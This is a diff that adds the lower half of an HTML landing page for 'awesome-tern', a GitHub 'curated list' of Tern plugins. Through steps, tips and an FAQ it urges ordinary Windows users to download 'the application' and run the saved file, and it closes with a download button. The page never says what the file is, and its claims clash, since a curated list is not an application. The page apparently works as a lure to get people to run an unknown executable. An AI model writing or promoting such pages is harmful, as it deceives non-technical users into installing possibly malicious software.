+<ol style="margin:0 0 14px 0; padding-left:22px; color:#334155;">
+<li style="margin-bottom:10px;"><strong>Open the page.</strong> Use the link on this page to reach the official awesome-tern page in your web browser.</li>
+<li style="margin-bottom:10px;"><strong>Start the download.</strong> Follow the download area on that page to save the application to your computer. Your browser will usually show the progress in a small bar or in the downloads list.</li>
+<li style="margin-bottom:0;"><strong>Run the application.</strong> When the download has finished, open the file you saved and follow any on-screen prompts that appear.</li>
+</ol>
+<p style="margin:0; color:#334155;">Keep the official page bookmarked or saved as a favourite. It is the most dependable place to return to if you need the application again, and it also holds the curated list of plugins, apps, tools, and resources you can browse at any time.</p>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">🔧 Simple Tips for a Smooth Experience</h2>
+<p style="margin:0 0 14px 0; color:#334155;">A few small habits make the whole process easier, especially on a Windows computer.</p>
+<ul style="margin:0; padding-left:22px; color:#334155;">
+<li style="margin-bottom:10px;"><strong>Use a modern browser.</strong> An up-to-date version of Edge, Chrome, or Firefox will display the page correctly and handle the download without trouble.</li>
+<li style="margin-bottom:10px;"><strong>Know where files go.</strong> By default, Windows saves downloads to your Downloads folder. That is the first place to look if you cannot find the file you just saved.</li>
+<li style="margin-bottom:10px;"><strong>Allow the download to finish.</strong> Wait for the progress indicator to complete before opening anything, so the file is fully saved.</li>
+<li style="margin-bottom:10px;"><strong>Keep one copy of the page.</strong> Bookmarking the official page means you can always find your way back to the download area and the curated list.</li>
+<li style="margin-bottom:0;"><strong>Read the descriptions.</strong> The entries in the curated list are written in plain language, so reading them helps you pick the additions that suit you best.</li>
+</ul>
+</section>
+
+<section style="background:#ffffff; border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; margin-bottom:24px;">
+<h2 style="margin:0 0 14px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">❓ Common Questions</h2>
+<p style="margin:0 0 14px 0; color:#334155;"><strong>Do I need to be a programmer?</strong> No. This page and the curated list are written for ordinary computer users. You only need to be able to open a web browser and follow the download area on the official page.</p>
+<p style="margin:0 0 14px 0; color:#334155;"><strong>Do I need an account?</strong> No account is required to visit the official page or to download the application.</p>
+<p style="margin:0 0 14px 0; color:#334155;"><strong>Is this a paid product?</strong> The project is published openly on GitHub as a curated community list. You can visit the page to read the details for yourself.</p>
+<p style="margin:0 0 14px 0; color:#334155;"><strong>What if the page does not load?</strong> Check your internet connection, then try again in a different browser. If the page still does not open, wait a few minutes and retry, since websites occasionally have brief outages.</p>
+<p style="margin:0; color:#334155;"><strong>Can I come back later?</strong> Yes. The official page remains available, so you can return whenever you want to download the application again or browse the curated list of plugins, apps, tools, and resources.</p>
+</section>
+
+<section style="background:linear-gradient(135deg, #ffffff, #f8fafc); border-radius:22px; padding:clamp(20px, 4vw, 34px); box-shadow:0 12px 30px rgba(15, 23, 42, 0.07); border:1px solid #e2e8f0; text-align:center;">
+<h2 style="margin:0 0 12px 0; font-size:clamp(1.35rem, 3.2vw, 1.62rem); line-height:1.25; color:#0f172a;">🎯 Ready to Begin?</h2>
+<p style="margin:0 0 18px 0; color:#475569;">Head to the official page to download the application and browse the curated list of Tern plugins, apps, tools, and resources.</p>
+<a href="https://github.com/josephf8503/awesome-tern" style="display:inline-block; background:linear-gradient(135deg, #2563eb, #7c3aed 55%, #db2777); color:#ffffff; font-size:clamp(1rem, 2.5vw, 1.16rem); font-weight:800; padding:17px 32px; border-radius:999px; text-decoration:none; box-shadow:0 14px 30px rgba(124, 58, 237, 0.28);">⬇️ Visit this link to download the application</a>
+</section>
+
+<footer style="text-align:center; padding:26px 10px 10px 10px; color:#64748b; font-size:0.9rem;">
+<p style="margin:0;">awesome-tern · Curated plugins, apps, tools and resources for Tern</p>
+</footer>
+
+</main>
 </body>
 </html>
